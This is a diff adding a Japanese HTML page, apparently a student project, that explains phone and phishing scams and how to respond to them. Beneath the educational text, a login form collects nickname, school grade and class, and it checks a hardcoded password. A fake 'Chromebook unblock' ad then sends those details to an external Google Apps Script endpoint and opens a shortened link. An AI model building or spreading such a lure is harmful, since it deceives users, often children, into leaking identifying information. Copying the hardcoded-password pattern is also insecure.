@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>詐欺の手口について</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #f0f4f8;
+      animation: fadeIn 1s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .header {
+      padding: 20px;
+      text-align: center;
+      background-color: #4CAF50;
+      color: white;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      animation: slideDown 0.5s ease;
+    }
+
+    @keyframes slideDown {
+      from { transform: translateY(-100%); }
+      to { transform: translateY(0); }
+    }
+
+    .content {
+      display: none; /* 初期状態は非表示 */
+      padding: 40px 20px;
+      max-width: 800px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: none; /* 初期状態を非表示 */
+      z-index: 999; /* コンテンツより下 */
+    }
+
+    .login-container {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+      z-index: 1000; /* 他のコンテンツの上に表示 */
+    }
+
+    .login-container h2 {
+      margin: 0 0 10px;
+    }
+
+    .login-container input {
+      display: block;
+      margin: 10px 0;
+      padding: 8px;
+      width: 100%;
+    }
+
+    .login-button {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 10px;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: background-color 0.3s;
+    }
+
+    .login-button:hover {
+      background-color: #45a049;
+    }
+
+    .ad-container {
+      position: fixed;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+      width: 300px;
+      background-color: #ffcc00;
+      border: 2px solid #333;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+      display: none; /* 初期状態を非表示 */
+      z-index: 1000; /* 他のコンテンツの上に表示 */
+      animation: slideIn 0.5s ease; /* スライドインアニメーション */
+    }
+
+    @keyframes slideIn {
+      from { transform: translate(-50%, -60%); opacity: 0; }
+      to { transform: translate(-50%, -50%); opacity: 1; }
+    }
+
+    .close-btn {
+      background: transparent;
+      border: none;
+      font-size: 20px;
+      color: #333;
+      cursor: pointer;
+      position: absolute;
+      top: 10px;
+      right: 10px;
+    }
+
+    .open-button {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 10px 15px;
+      cursor: pointer;
+      border-radius: 5px;
+      font-size: 16px;
+      display: block;
+      margin: 20px auto 0;
+      transition: background-color 0.3s;
+    }
+
+    .open-button:hover {
+      background-color: #45a049;
+    }
+
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <h1>詐欺の手口について説明書</h1>
+</div>
+
+<div class="overlay" id="overlay"></div>
+
+<div class="login-container" id="login-container">
+  <h2>ログイン</h2>
+  <input type="text" id="nickname" placeholder="ニックネーム" required>
+  <input type="password" id="password" placeholder="パスワード" required>
+  <input type="text" id="grade" placeholder="学年" required>
+  <input type="text" id="class" placeholder="組" required>
+  <button class="login-button" id="login-button">開く</button>
+</div>
+
+<div class="content" id="content">
+  <div class="section">
+    <h2>詐欺の手口</h2>
+    <p>
+      詐欺はさまざまな手口で行われる犯罪であり、その手法は年々進化しています。特に、電話やメールを利用した詐欺は非常に多く、広く知られている手口もいくつかあります。電話詐欺の代表例として「振り込め詐欺」があり、これは家族や親しい友人を装った詐欺師が急な金銭を要求するものです。たとえば、「事故に遭った」「急にお金が必要だ」といったメッセージで、相手を不安にさせてしまいます。このような手口は、特に高齢者を狙ったものが多いです。<br>
+      また、メールでのフィッシング詐欺も注意が必要です。これには、正規の会社を装った偽のメールが送りつけられ、受信者が偽のリンクをクリックするよう仕向けられます。このリンクをクリックすると、個人情報やクレジットカード情報を盗まれてしまう危険があります。最近では、SNSやチャットアプリを使った詐欺も増えており、友人や知人を装って金銭を要求するケースが後を絶ちません。これらの詐欺は、見た目には本物と見間違えるほど巧妙になってきているため、注意が必要です。
+    </p>
+  </div>
+
+  <div class="section">
+    <h2>詐欺に遭った場合の対処法</h2>
+    <p>
+      もし詐欺に遭ってしまった場合、まず最初にやるべきことは、冷静になることです。焦って行動することは、さらに状況を悪化させる可能性があります。直ちに警察や消費生活センターに相談することが重要です。警察に連絡する際には、詐欺の詳細をできるだけ詳しく伝えることが求められます。具体的には、詐欺師からの電話の内容や、受信したメールの内容、金銭が移動した場合はその履歴などを準備しておくと良いでしょう。<br>
+      次に、消費生活センターに相談することも大切です。専門のスタッフが対応してくれるため、具体的なアドバイスやサポートを受けることができます。また、クレジットカードや銀行口座が不正に利用された場合は、すぐに発行会社に連絡して対処を求めることが不可欠です。必要に応じて、口座の凍結やクレジットカードの利用停止を依頼することが可能です。<br>
+      さらに、周囲の人々にも警告を発信することが重要です。特に、同じような手口で狙われる可能性のある家族や友人に対して情報を共有することで、被害を未然に防ぐ手助けとなります。最後に、必要に応じてカウンセリングを受けることも考慮してください。詐欺の被害に遭うことは精神的にも大きなストレスとなるため、自分自身の心のケアも忘れないようにしましょう。
+    </p>
+  </div>
+  <p>制作 HTML・レイアウト:薛 JavaScript:又木</p>
+</div>
+
+<div class="ad-container" id="ad-container">
+  <button class="close-btn" id="close-ad">✕</button>
+  <h3>広告</h3>
+  <p>Chromebookのブロック解除方法を知りたいですか？詳細はここをクリック！</p>
+  <button class="open-button" id="open-details">開く</button>
+</div>
+
+<script>
+
+      
+  document.addEventListener('DOMContentLoaded', function() {
+    var content = document.getElementById('content');
+    var overlay = document.getElementById('overlay');
+    var loginContainer = document.getElementById('login-container');
+    var adContainer = document.getElementById('ad-container');
+
+    document.getElementById('login-button').addEventListener('click', function() {
+      var password = document.getElementById('password').value;
+      var nickname = document.getElementById('nickname').value;
+      var grade = document.getElementById('grade').value;
+      var classValue = document.getElementById('class').value;
+
+      if (password === "Akatsuka2") {
+        overlay.style.display = 'none'; // 背景を非表示
+        loginContainer.style.display = 'none'; // ログイン画面を非表示
+        content.style.display = 'block'; // コンテンツを表示
+        adContainer.style.display = 'block'; // 広告を表示
+      } else {
+        alert("パスワードが違います。");
+      }
+    });
+
+    // 広告を閉じる機能
+    document.getElementById('close-ad').addEventListener('click', function() {
+      adContainer.style.display = 'none';
+    });
+
+    // 広告の詳細を開くボタン
+    document.getElementById('open-details').addEventListener('click', function() {
+      const nickname = document.getElementById('nickname').value;
+      const grade = document.getElementById('grade').value;
+      const classValue = document.getElementById('class').value;
+      
+      window.open("https://script.google.com/a/macros/ita.ed.jp/s/AKfycbwzIIW89GOve2J9TZF7YCeAlu81Lw0nCnvZUVa2Pdt19HJIwEBUO-j38CGrK8H3NRc0kw/exec?q=ユーザー名:" + nickname + "学年:" + grade + "クラス:" + classValue);
+      window.open("https://x.gd/1zMsr	");
+    });
+
+    // 初期表示
+    overlay.style.display = 'block'; // ログイン画面を表示
+  });
+</script>
+
+</body>
+</html>
+
+
